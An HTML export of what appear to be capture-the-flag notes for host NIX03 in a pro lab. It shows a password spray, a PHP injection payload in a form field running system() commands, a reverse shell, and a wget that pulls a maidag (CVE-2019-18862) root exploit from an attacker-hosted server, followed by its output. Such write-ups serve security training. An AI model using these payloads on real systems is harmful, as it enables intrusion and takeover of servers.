<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>NIX03 - 172.16.4.120</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>NIX03 - 172.16.4.120</h1><br/><p><a href="Offshore--NIX03_-_172.16.4.120_27.html#OFS-Flag35">Flag 35</a></p><p><a href="Offshore--NIX03_-_172.16.4.120_27.html#OFS-Flag36">Flag 36</a></p><p><a href="Offshore--NIX03_-_172.16.4.120_27.html#OFS-Flag37">Flag 37</a></p><p><a href="Offshore--NIX03_-_172.16.4.120_27.html#OFS-Flag38">Flag 38</a></p><p></p><p>There is a login form at <a href="http://172.16.4.120/client/">http://172.16.4.120/client/</a> - I think the login is admin from the bookmark we found on DC04.</p><p></p><p>Let&#39;s use Burpsuite to try a password spray from words we put together going through the lab.</p><p></p><p><img src="images/27-1.png" alt="images/27-1.png" /></p><p></p><p><a name="OFS-Flag35"></a><code><span style="background-color:#000000;">Our login credentials are admin : h1dd3n_1n_pl@iN_$1ght</span></code></p><p></p><p>If we go to Add Transaction and fill out the form, catch this request in burpsuite, we can get RCE.</p><p></p><p>from=test&amp;fromaddr=&amp;to=test&amp;toaddr=&amp;amount=x&#39;) === true || system($_POST[&#39;cmd&#39;]) || is_numeric(&#39;x&amp;comments=test&amp;cmd=id</p><p></p><p><img src="images/27-2.png" alt="images/27-2.png" /></p><p></p><p>We can use this PHP rev shell <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php</a>  (open it and change the IP)</p><p></p><p>Serve it up on your http server and download it to the target</p><p></p><p><img src="images/27-3.png" alt="images/27-3.png" /></p><p></p><p><code><span style="background-color:#000000;">$ cat /home/client_banking/flag.txt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><a name="OFS-Flag36"></a>OFFSHORE{d0nt_tru$t_y0ur_us3rs}</p><p></p><p><code><span style="background-color:#000000;">$ cat /var/www/flag.txt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><a name="OFS-Flag37"></a>OFFSHORE{a$$ert1on_r1fl3!!!}</p><p></p><p>If we run linpeas, it shows the mysql username and password are root / toor</p><p></p><p><code><span style="background-color:#000000;">client_banking@NIX03:/$ mysql -u root -p</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">mysql -u root -p</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Enter password: toor     </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">use flag;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">select * from gameover;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">exit</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">flag_value</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">OFFSHORE{3ncrypt10n_w0rk$_w0nd3rs}</span></code></p><p></p><p>Find all files with setuid permissions</p><p></p><p><code><span style="background-color:#000000;">find / -type f -perm /4000 -print 2&gt;/dev/null </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/usr/local/sbin/maidag</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/usr/local/bin/sudo</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/usr/lib/eject/dmcrypt-get-device</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/usr/lib/policykit-1/polkit-agent-helper-1</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/usr/lib/openssh/ssh-keysign</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/usr/bin/passwd</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/usr/bin/chfn</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/usr/bin/newgrp</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/usr/bin/vmware-user-suid-wrapper</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/usr/bin/sudo</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/usr/bin/chsh</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/usr/bin/gpasswd</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/bin/ping</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/bin/ping6</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/bin/mount</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/bin/umount</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/bin/fusermount</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/bin/su</span></code></p><p></p><p>Check the version of maidag</p><p><code><span style="background-color:#000000;">/usr/local/sbin/maidag --version</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">maidag (GNU Mailutils) 3.7</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Copyright (C) 2007-2019 Free Software Foundation, inc.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">This is free software: you are free to change and redistribute it.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">There is NO WARRANTY, to the extent permitted by law.</span></code></p><p></p><p></p><p><a href="https://www.exploit-db.com/exploits/47703">https://www.exploit-db.com/exploits/47703</a></p><p>To get root, <a href="https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-18862/exploit.ldpreload.sh">https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-18862/exploit.ldpreload.sh</a></p><p></p><p><code><span style="background-color:#000000;">client_banking@NIX03:/home/client_banking$ wget 10.10.16.94:800/ldapreload.sh</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">wget 10.10.16.94:800/ldapreload.sh</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">--2023-05-03 13:32:11--  http://10.10.16.94:800/ldapreload.sh</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Connecting to 10.10.16.94:800... connected.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">HTTP request sent, awaiting response... 200 OK</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Length: 6774 (6.6K) [text/x-sh]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Saving to: &#39;ldapreload.sh&#39;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">     0K ......                                                100%  304K=0.02s</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">2023-05-03 13:32:11 (304 KB/s) - &#39;ldapreload.sh&#39; saved [6774/6774]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">client_banking@NIX03:/home/client_banking$ chmod +x ldapreload.sh</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">chmod +x ldapreload.sh</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">client_banking@NIX03:/home/client_banking$ ./ldapreload.sh</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">./ldapreload.sh</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] /usr/local/sbin/maidag is set-uid</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] Compiling...</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] Writing stub to /tmp/stub ...</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] Adding /tmp/libmaidag.so to /etc/ld.so.preload...</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">-rw------- 1 root client_banking 62 May  3 13:32 /etc/ld.so.preload</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] Wait for your shell to be set-uid root: /var/tmp/sh</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] Spamming TCP connections to 127.0.0.1:25 ...</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">220 NIX03 ESMTP Postfix (Ubuntu)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">221 2.0.0 Bye</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">220 NIX03 ESMTP Postfix (Ubuntu)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">221 2.0.0 Bye</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">220 NIX03 ESMTP Postfix (Ubuntu)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">221 2.0.0 Bye</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">220 NIX03 ESMTP Postfix (Ubuntu)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">221 2.0.0 Bye</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">220 NIX03 ESMTP Postfix (Ubuntu)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">221 2.0.0 Bye</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">220 NIX03 ESMTP Postfix (Ubuntu)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">221 2.0.0 Bye</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">220 NIX03 ESMTP Postfix (Ubuntu)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">221 2.0.0 Bye</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">220 NIX03 ESMTP Postfix (Ubuntu)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">221 2.0.0 Bye</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">220 NIX03 ESMTP Postfix (Ubuntu)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">221 2.0.0 Bye</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">220 NIX03 ESMTP Postfix (Ubuntu)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">221 2.0.0 Bye</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Success:</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">-rwsrwxrwx 1 root root 8712 May  3 13:32 /var/tmp/sh</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] Cleaning up ...</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">whoami</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">root</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">cat /root/flag.txt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><a name="OFS-Flag38"></a>OFFSHORE{s3tuid_f0r_th3_k1ll_sh0t!}</p></div>
</body>
</html>
